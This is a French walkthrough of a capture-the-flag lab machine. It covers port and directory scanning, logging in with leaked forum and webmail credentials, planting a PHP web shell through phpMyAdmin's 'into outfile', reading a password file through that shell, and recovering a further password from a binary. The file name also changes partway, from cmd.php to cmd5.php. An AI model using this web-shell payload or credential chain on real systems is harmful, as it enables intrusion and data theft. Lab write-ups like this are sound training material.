@@ -1,0 +1,22 @@
+On check les ports avec nmap et on remarque qu'il y a un port https.
+On lance dirb avec l'adresse https et il nous montre 3 adresses accessibles, forum, webmail et phpmyadmin.
+En allant sur le message "Probleme login ?" du forum et en cherchant un pass, on remarque que l'utilisateur lmezard a mis !q\]Ej?*5K5cy*AJ en tant que user, on peut en deduire que c'est son pass.
+On se log donc avec lmezard et son pass, ce qui nous donne acces a la page webmail.
+Il nous demande une adresse mail et un password, on trouve l'adresse mail de lmezard sur la page de son profil : laurie@borntosec.net et le pass est le meme que pour le forum.
+Sur le webmail, on trouve un mail DB Access, on remarque qu'il nous donne les identifiants pour se connecter a la base de donnees : root et Fg-'kKXBj87E:aJ$.
+On va donc sur phpmyadmin, on se connecte et on peut executer une commande pour creer un fichier php qui execute une commande qu'on passe en parametre.
+Avec nikto, on remarque que le site est sur un serveur apache et le chemin par defaut est /var/www.
+Dirb nous montre 6 dossiers dans le forum, on les teste tous et on remarque qu'on peut creer le fichier dans /var/www/forum/templates_c avec la commande :
+select "<? $output = shell_exec($_REQUEST['cmd']); echo \"$output\"; ?>" into outfile "/var/www/forum/templates_c/cmd.php"
+Du coup, on peut recuperer le login lmezard et le password G!@M6f4Eatau{sF" avec https://192.168.56.101/forum/templates_c/cmd5.php?cmd=cat%20/home/LOOKATME/password
+
+
+
+Si on affiche le contenu du fichier fun et on remarque un main.
+Ce main nous indique que chaque caractere du password est le retour des fonctions getme auquel on applique un sha256.
+Si on fouille le fichier, on remarque les fonctions getme7, getme8, getme9, getme10, getme11 et getme12 qui nous retournent les caracteres suivants : pwnage
+On cherche ensuite des return avec la commande suivante : cat fun | tr -d '\0' | grep return
+La commande "tr -d '\0'" permet de virer tous les caracteres \0 pour que le grep puisse fonctionner correctement, sinon on a une erreur : Binary file (standard input) matches
+On recupere les caracteres suivants : hpeaIrt
+On remet dans l'ordre et on ajoute les caracteres precedents, ce qui nous donne Iheartpwnage et on fait un sha256 : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+On peut maintenant se connecter en ssh a laurie
